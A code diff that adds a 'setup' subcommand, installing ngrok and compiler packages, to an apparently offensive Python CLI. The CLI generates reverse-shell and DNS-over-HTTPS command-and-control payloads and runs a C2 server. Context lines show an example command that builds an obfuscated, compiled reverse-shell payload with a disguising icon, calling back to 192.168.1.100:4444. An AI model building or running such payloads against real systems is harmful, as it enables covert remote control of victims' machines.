@@ -48,6 +48,7 @@ Examples:
   %(prog)s doh -d example.com                   # Create DoH C2 payload
   %(prog)s server example.com                   # Start C2 server
   %(prog)s server example.com --https           # Start C2 server with HTTPS
+  %(prog)s setup                                # Install optional deps (ngrok, compile)
   
   # Advanced options with obfuscation and compilation
   %(prog)s reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --icon app.ico --delay
@@ -155,6 +156,16 @@ For detailed help on a specific command, run:
     server_parser.add_argument('--key', help='Path to private key file (for HTTPS, auto-generated if not provided)')
     server_parser.add_argument('--debug', action='store_true', help='Enable Flask debug mode')
     
+    # Setup optional dependencies (pyngrok, nuitka, sandboxed)
+    setup_parser = subparsers.add_parser('setup',
+                                         help='Install optional dependencies (ngrok, binary compilation)',
+                                         description='Install optional Python packages required for ngrok tunnel listing and compiling payloads to binaries. Run this if you see "pip install" messages when using --ngrok or --compile.')
+    setup_group = setup_parser.add_mutually_exclusive_group()
+    setup_group.add_argument('--user', action='store_true',
+                             help='Install to user site (default)')
+    setup_group.add_argument('--system', action='store_true',
+                             help='Install system-wide (may require sudo)')
+    
     return parser
 
 def load_config(config_path):
@@ -194,7 +205,10 @@ def validate_args(args):
             print("[!] Invalid Bitcoin address format")
             return False
     
-    if args.command == 'server':
+    if args.command == 'setup':
+        # No extra validation needed
+        pass
+    elif args.command == 'server':
         # Validate server arguments
         if not (1024 <= args.port <= 65535):
             print("[!] Port must be between 1024 and 65535")
@@ -494,6 +508,31 @@ def start_listener_if_needed(args):
         except Exception as e:
             print(f"[!] Failed to start listener: {e}")
 
+def execute_setup(args):
+    """Install optional dependencies via pip."""
+    import subprocess
+    packages = ["pyngrok", "nuitka", "sandboxed"]
+    cmd = [sys.executable, "-m", "pip", "install"]
+    if getattr(args, 'system', False):
+        pass  # system-wide
+    else:
+        # default: install to user site (no sudo)
+        cmd.append("--user")
+    cmd.extend(packages)
+    print("[*] Installing optional dependencies (pyngrok, nuitka, sandboxed)...")
+    print(f"[*] Running: {' '.join(cmd)}")
+    try:
+        result = subprocess.run(cmd)
+        if result.returncode == 0:
+            print("[+] Setup complete. You can now use --ngrok and --compile.")
+        else:
+            print("[!] Some packages may have failed. Try running the command above manually.")
+        return result.returncode == 0
+    except FileNotFoundError:
+        print("[!] pip not found. Install pip or run: python3 -m ensurepip")
+        return False
+
+
 def main_cli():
     """Main CLI entry point."""
     parser = create_parser()
@@ -527,6 +566,11 @@ def main_cli():
         if not success:
             print("[!] Server failed to start")
         return
+    
+    # Handle setup (install optional deps)
+    if args.command == 'setup':
+        success = execute_setup(args)
+        sys.exit(0 if success else 1)
     
     # Show banner unless quiet
     if not args.quiet:
